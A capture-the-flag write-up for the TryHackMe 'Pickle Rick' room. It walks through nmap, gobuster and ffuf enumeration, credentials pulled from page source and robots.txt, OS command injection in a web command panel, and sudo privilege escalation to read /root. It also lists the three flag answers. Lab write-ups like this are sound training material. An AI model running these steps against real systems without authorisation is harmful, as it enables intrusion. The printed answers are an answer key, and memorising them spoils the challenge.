# Solution

## URL
- [Pickle Rick](https://tryhackme.com/room/picklerick)

## Steps

### Enumerate:
1. Let us run an NMAP scan on the IP: `sudo nmap -v -sS -A -p- 10.10.121.42 | tee TryHackMe/pickle-rick/nmap-scan.txt`
2. Since we already know there is a website let us check if `/robots.txt` is there.
3. Contents of `/robots.txt`: `Wubbalubbadubdub`.
4. Let us also check the source code of index page. Found a comment: `Username: R1ckRul3s`.
5. Run gobuster on webiste to find hidden directories/files: `gobuster -u http://10.10.121.42/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt`.
6. Let's see if `/sitemap.xml` is there. Checked, it is not there.
7. Tried `Wubbalubbadubdub` which we found in `/robots.txt` as a path, did not work.
8. NMAP scan shows ssh is open let's try to connect to it with the username we found and `Wubbalubbadubdub` as password. Permission denied, only accepts key based auth ig.
9. Fuzzing for logins using ffuf: `ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/Logins.fuzz.txt -u http://10.10.121.42/FUZZ -mc 200,301,302,403 -fs 1062 -v | tee TryHackMe/pickle-rick/ffuf-logins.txt` we found `/login.php`.

### OS Command Injection
1. In the `Command Panel` we can run OS commands.
2. Running `ls` we got:
    ```
    Sup3rS3cretPickl3Ingred.txt
    assets
    clue.txt
    denied.php
    index.html
    login.php
    portal.php
    robots.txt
    ```
3. `cat` command is disabled, so we can't use that to read `Sup3rS3cretPickl3Ingred.txt`.
4. So we will use `less Sup3rS3cretPickl3Ingred.txt`, which gives the answer to the first question: `mr. meeseek hair`.
5. Checking the home directory: `ls -al /home` we got, `rick` and `ubuntu`.
6. Checking rick's directory we got `second ingredients` file.
7. Reading that with: `less "/home/rick/second ingredients"` we get the answer to the second question `1 jerry tear`.
8. Checking our sudo privileges `sudo -l`, we get:
    ```
    Matching Defaults entries for www-data on ip-10-10-121-42.eu-west-1.compute.internal:
        env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

    User www-data may run the following commands on ip-10-10-121-42.eu-west-1.compute.internal:
        (ALL) NOPASSWD: ALL
    ```

9. This means we can run any command. `sudo ls /root` gives us a file called `3rd.txt`.
10. Reading this with `sudo less /root/3rd.txt` gives us the final answer `3rd ingredients: fleeb juice`.

### Task 1:
#### What is the first ingredient that Rick needs?
1. The answer is `mr. meeseek hair`.

#### What is the second ingredient in Rick’s potion?
1. The answer is `1 jerry tear`.

#### What is the last and final ingredient?
1. The answer is `fleeb juice`.